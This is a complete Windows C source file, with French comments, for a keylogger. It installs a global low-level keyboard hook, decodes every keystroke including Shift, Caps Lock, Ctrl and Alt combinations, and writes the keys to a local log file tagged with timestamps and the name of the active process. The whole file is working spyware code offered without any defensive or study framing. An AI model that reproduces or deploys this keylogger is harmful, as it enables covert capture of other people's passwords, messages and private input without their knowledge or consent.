#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Shlwapi.lib")

// Variables globales
HHOOK   g_hook;
FILE*   g_logfile;
HWND    g_last_window = NULL;  // Dernière fenêtre enregistrée
char    g_last_process[MAX_PATH] = "";  // Dernier processus enregistré

// Prototypes de fonctions
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
static void write_to_log(const char* str);
static void log_new_window(const char* process_name);

// Fonction principale
int main(void)
{
    // Ouvrir le fichier log
    g_logfile = fopen("keystrokes.log", "a");
    if (g_logfile == NULL) {
        MessageBox(NULL, "Erreur d'ouverture du fichier log.", "Erreur", MB_ICONERROR);
        return 1;
    }

    // Installer le hook
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (g_hook == NULL) {
        MessageBox(NULL, "Erreur lors de l'installation du hook.", "Erreur", MB_ICONERROR);
        fclose(g_logfile);
        return 1;
    }

    // Boucle de message
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Nettoyage
    UnhookWindowsHookEx(g_hook);
    fclose(g_logfile);
    return 0;
}

// Fonction de hook pour capturer les frappes
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        char key[32] = { 0 };

        // Récupérer l'état du clavier
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        // Vérifier l'état de Shift et de Caps Lock
        BOOL isShiftPressed = GetKeyState(VK_SHIFT) & 0x8000;
        BOOL isCapsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;

        // Ignorer les touches Shift, Ctrl, Alt, et Caps Lock pour éviter qu'elles soient loggées sous forme de code
        /*if (pKeyboard->vkCode == VK_SHIFT || pKeyboard->vkCode == VK_LSHIFT || pKeyboard->vkCode == VK_RSHIFT ||
            pKeyboard->vkCode == VK_CONTROL || pKeyboard->vkCode == VK_LCONTROL || pKeyboard->vkCode == VK_RCONTROL ||
            pKeyboard->vkCode == VK_MENU || pKeyboard->vkCode == VK_LMENU || pKeyboard->vkCode == VK_RMENU ||
            pKeyboard->vkCode == VK_CAPITAL) {
            return CallNextHookEx(g_hook, nCode, wParam, lParam);
        }*/

        // Ignorer les touches non imprimables
        if (pKeyboard->vkCode < 0x20 || pKeyboard->vkCode > 0x7E) {
            // Inclure des exceptions pour les touches que vous voulez loguer
            if (pKeyboard->vkCode != VK_RETURN && pKeyboard->vkCode != VK_SPACE &&
                pKeyboard->vkCode != VK_TAB && pKeyboard->vkCode != VK_BACK) {
                return CallNextHookEx(g_hook, nCode, wParam, lParam);
            }
        }

        switch (pKeyboard->vkCode) {
        case VK_TAB:
            strcpy(key, "[Tab]");
            break;
        case VK_RETURN:
            strcpy(key, "[Enter]");
            break;
        case VK_BACK:
            strcpy(key, "[Backspace]");
            break;
        default:
            // Conversion de la touche en fonction de l'état actuel du clavier
            if (ToAscii(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, (LPWORD)key, 0) == 1) {
                if ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn)) {
                    // Convertir en majuscule
                    key[0] = (char)toupper(key[0]);

                }
                else if (!isShiftPressed && !isCapsLockOn) {
                    // Convertir en minuscule
                    key[0] = (char)tolower(key[0]);
                }
            }
            else {
                sprintf(key, "[%lu]", pKeyboard->vkCode);
            }
            // Ajoutez d'autres touches spéciales ici
        }

        // Gérer les combinaisons de touches (e.g., Ctrl+C)
        if (GetKeyState(VK_CONTROL) & 0x8000) {
            sprintf(key, "[Ctrl+%c]", key[0]);
        }
        if (GetKeyState(VK_MENU) & 0x8000) {  // Alt key
            sprintf(key, "[Alt+%c]", key[0]);
        }

        // Écrire la touche dans le fichier log
        write_to_log(key);
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// Fonction pour enregistrer le changement de fenêtre
static void log_new_window(const char* process_name)
{
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);

    fprintf(g_logfile, "\n[%04d-%02d-%02d %02d:%02d:%02d] (%s)\n",
        tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
        tm.tm_hour, tm.tm_min, tm.tm_sec,
        process_name);
    fflush(g_logfile);
}

// Fonction pour écrire dans le fichier log
static void write_to_log(const char* str)
{
    // Obtenir la fenêtre et le processus en premier plan
    HWND foreground_window = GetForegroundWindow();
    DWORD pid;
    GetWindowThreadProcessId(foreground_window, &pid);

    if (foreground_window != g_last_window) {
        // La fenêtre a changé, mettre à jour le processus et la fenêtre enregistrés
        g_last_window = foreground_window;

        HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (process) {
            char process_name[MAX_PATH] = "<Unknown>";
            GetModuleFileNameEx(process, NULL, process_name, MAX_PATH);
            strcpy(process_name, PathFindFileName(process_name));
            CloseHandle(process);

            // Log the new process and window
            if (strcmp(g_last_process, process_name) != 0) {
                strcpy(g_last_process, process_name);
            }
            log_new_window(process_name);
        }
    }
    fprintf(g_logfile, "%s", str);
    fflush(g_logfile);
}
